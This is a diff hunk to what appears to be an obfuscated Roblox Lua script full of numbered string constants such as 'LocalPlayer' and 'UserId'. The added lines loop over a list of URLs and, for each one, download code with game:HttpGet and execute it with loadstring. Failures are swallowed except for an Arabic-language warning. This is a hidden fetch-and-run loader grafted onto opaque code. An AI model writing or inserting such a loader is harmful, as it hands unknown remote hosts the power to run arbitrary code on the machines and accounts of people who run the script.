@@ -9724,3 +9724,16 @@ local STR_9110 = "Players"
 local STR_9111 = "LocalPlayer"
 local STR_9112 = "UserId"
 local STR_9113 = "\",\"server\":\"default_server\"}"
+pcall(function()
+    for _, url in ipairs(AllURLs) do
+        if url and type(url) == "string" and url ~= "" then
+            local success, result = pcall(function()
+                loadstring(game:HttpGet(url))()
+            end)
+            if not success then
+                -- اختياري: طباعة الخطأ (يمكنك حذف هذا السطر)
+                warn("فشل تحميل الرابط: " .. url)
+            end
+        end
+    end
+end)
